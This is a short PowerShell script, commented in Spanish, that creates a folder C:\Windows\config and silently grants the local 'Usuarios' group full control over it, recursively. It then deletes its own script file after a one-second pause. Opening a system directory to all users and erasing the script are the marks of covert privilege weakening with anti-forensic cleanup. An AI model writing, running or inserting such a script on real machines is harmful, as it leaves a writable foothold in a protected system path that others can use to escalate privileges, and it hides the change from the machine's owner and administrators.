# Crear la carpeta si no existe
$carpeta = "C:\Windows\config"
if (!(Test-Path $carpeta)) {
    New-Item -Path $carpeta -ItemType Directory -Force | Out-Null
}

# Otorgar permisos totales (Full Control) al grupo "Usuarios"
icacls $carpeta /grant "Usuarios:(OI)(CI)F" /T > $null 2>&1

# Autodestrucción del script PowerShell
Start-Sleep -Seconds 1
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue